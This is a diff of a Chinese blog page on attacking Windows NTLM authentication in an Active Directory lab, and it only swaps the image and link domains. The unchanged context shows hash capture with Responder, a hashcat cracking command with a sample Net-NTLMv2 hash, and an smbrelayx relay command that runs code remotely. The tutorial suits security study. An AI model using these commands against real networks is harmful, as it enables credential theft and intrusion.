@@ -64,7 +64,7 @@ window.onload=getCSS();
 			
 		<header id="header" class="site-header" 
 		
-		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://thekingofduck.github.io/post-images/ADStudy-Part-3-Attack-NTLM.png)"
+		style="background-image: linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2)),url(https://blog.thekingofduck.com/post-images/ADStudy-Part-3-Attack-NTLM.png)"
 		
 		>
 			<div class="site-branding">
@@ -172,7 +172,7 @@ window.onload=getCSS();
 <p>在一些条件下通过中间人抓到了站点登录后台登录时的Web流量，但是登录密码被前端加密了（比如MD5），hash值无法解密，这时候我们只需要重放这个登陆包就可以完成后台登录认证。</p>
 </blockquote>
 <p>在Net-NTLM认证过程中Net-NTLM hash传递发生在质询第二个包：</p>
-<figure data-type="image" tabindex="1"><img src="https://thekingofduck.github.io/post-images/1583251221865.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="1"><img src="https://blog.thekingofduck.com/post-images/1583251221865.png" alt="" loading="lazy"></figure>
 <p>里面最关键的字段是用户名以及Response。缺一不可，所以原则上来说进行Hash传递的条件有两:</p>
 <ul>
 <li>
@@ -212,11 +212,11 @@ window.onload=getCSS();
 <p>img标签是支持smb协议，然后smb协议本质上走的NTLM认证，NTLM认证在用户输入凭证前又会默认使用本地NTLM Hash先进行认证一遍，所以在无法Getshell的情况下，就可以伪造一个smb客户端，再通过该手法获取到Net-NTLM Hash，最后执行解密工作或hash传递攻击</p>
 <p><strong>Responder伪造认证服务端</strong>：</p>
 <p>伪造一个Net-NTLM协议认证服务端，当用户进行访问时系统默认会先将本地Net-NTLM hash进行验证，该hash可进行碰撞解密获取密码。</p>
-<figure data-type="image" tabindex="2"><img src="https://thekingofduck.github.io/post-images/1583305815079.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="2"><img src="https://blog.thekingofduck.com/post-images/1583305815079.png" alt="" loading="lazy"></figure>
 <p>在目标机器上访问伪造的客户端(可以是多种形式，比如上面说到的xss获取)</p>
-<figure data-type="image" tabindex="3"><img src="https://thekingofduck.github.io/post-images/1583305985478.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="3"><img src="https://blog.thekingofduck.com/post-images/1583305985478.png" alt="" loading="lazy"></figure>
 <p>获得Net-NTLM hash：</p>
-<figure data-type="image" tabindex="4"><img src="https://thekingofduck.github.io/post-images/1583306002981.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="4"><img src="https://blog.thekingofduck.com/post-images/1583306002981.png" alt="" loading="lazy"></figure>
 <p>同类工具还有<a href="https://github.com/Kevin-Robertson/Inveigh">Inveigh</a>,原理都是一样的</p>
 <h3 id="net-ntlm-hash-利用">Net-NTLM Hash 利用</h3>
 <p><strong>Net-NTLMv1 Hash加密策略远弱于v2，拿到Net-NTLM v1 hash就约等于NTLM HASH，v2在暴力破解不成功的情况下就可以考虑Relay攻击</strong></p>
@@ -224,7 +224,7 @@ window.onload=getCSS();
 <p>将Responder获取到的Net-NTLM hash交给hashcat进行暴力破解</p>
 <pre><code>hashcat -m 5600 attacker::ADSTUDY:1aef20d3cfba8772:9D01310D04E79AD84A789669BE40EF2C:0101000000000000D9C9E307FDF1D5014454D6B4C6B563920000000002000E0041004400530054005500440059000100060042004F0054000400160061006400730074007500640079002E0063006F006D0003001E0062006F0074002E0061006400730074007500640079002E0063006F006D000500160061006400730074007500640079002E0063006F006D0007000800D9C9E307FDF1D50106000400020000000800300030000000000000000000000000200000D6F78567C955B9EA05E044A994D2307E6DEF8486F2ECA33C9F042A0F501043C10A001000000000000000000000000000000000000900200063006900660073002F00310030002E0035002E003100300030002E0031003000000000000000000000000000 pass.txt --force
 </code></pre>
-<figure data-type="image" tabindex="5"><img src="https://thekingofduck.github.io/post-images/1583310530278.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="5"><img src="https://blog.thekingofduck.com/post-images/1583310530278.png" alt="" loading="lazy"></figure>
 <p>如图是暴力破解成功的情况。</p>
 <h4 id="net-ntlm-v2-hash-relay">Net-NTLM v2 hash Relay</h4>
 <p>以relay2smb为例：</p>
@@ -245,7 +245,7 @@ relay到 10.5.100.1 （2012）</p>
 </code></pre>
 </li>
 </ul>
-<p><img src="https://thekingofduck.github.io/post-images/1583313947570.png" alt="" loading="lazy"><br>
+<p><img src="https://blog.thekingofduck.com/post-images/1583313947570.png" alt="" loading="lazy"><br>
 （message_signing: disabled 即可，Responder自带的Runfinger也可以，不用检查也可以，Multirelay也会自动检查的）</p>
 <p>在kali上开启relay</p>
 <pre><code>python smbrelayx.py -h 192.168.22.162 -c whoami
@@ -254,8 +254,8 @@ relay到 10.5.100.1 （2012）</p>
 <pre><code>dir \\10.5.100.10\C$
 </code></pre>
 <p>即可relay成功。</p>
-<figure data-type="image" tabindex="7"><img src="https://thekingofduck.github.io/post-images/1583332013078.png" alt="" loading="lazy"></figure>
-<figure data-type="image" tabindex="8"><img src="https://thekingofduck.github.io/post-images/1583332020524.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="7"><img src="https://blog.thekingofduck.com/post-images/1583332013078.png" alt="" loading="lazy"></figure>
+<figure data-type="image" tabindex="8"><img src="https://blog.thekingofduck.com/post-images/1583332020524.png" alt="" loading="lazy"></figure>
 <h3 id="总结">总结</h3>
 <p>大多数情况攻击NTLM能成功都是因为NTLM在认证是默认会先使用本地hash去登录目标服务，因此可以制造各种机会去获取到Net-NTLM hash再进一步解密操作。</p>
 <ul>
@@ -285,19 +285,19 @@ relay到 10.5.100.1 （2012）</p>
 							</div>
 	<div class="wow bounceInDown vt-post-tags">
  
-				<a href="https://thekingofduck.github.io/tag/gmpF7RbPK/" rel="tag">攻击NTLM</a>	
+				<a href="https://blog.thekingofduck.com/tag/gmpF7RbPK/" rel="tag">攻击NTLM</a>	
 				 
-				<a href="https://thekingofduck.github.io/tag/bNi_XRNGwr/" rel="tag">域渗透</a>	
+				<a href="https://blog.thekingofduck.com/tag/bNi_XRNGwr/" rel="tag">域渗透</a>	
 				 
 					</div>						
 <nav class="navigation3 post-navigation3" role="navigation">
 		
 		<div class="nav-links3">
       
-		<div class="wow bounceInLeft nav-previous3"><a href="https://thekingofduck.github.io/post/ADStudy-Part-4-Kerbroes-Study/" rel="prev"> 域渗透学习笔记四：域认证机制Kerbroes刨析</a></div>
+		<div class="wow bounceInLeft nav-previous3"><a href="https://blog.thekingofduck.com/post/ADStudy-Part-4-Kerbroes-Study/" rel="prev"> 域渗透学习笔记四：域认证机制Kerbroes刨析</a></div>
 		 
 		 
-		<div class="wow bounceInRight nav-next3"><a href="https://thekingofduck.github.io/post/ADStudy-Part-2-Net-NTLM-Study/" rel="next"> 域渗透学习笔记二：Windows认证机制Net-NTLM刨析</a></div>
+		<div class="wow bounceInRight nav-next3"><a href="https://blog.thekingofduck.com/post/ADStudy-Part-2-Net-NTLM-Study/" rel="next"> 域渗透学习笔记二：Windows认证机制Net-NTLM刨析</a></div>
 		
 		</div>
 	</nav>
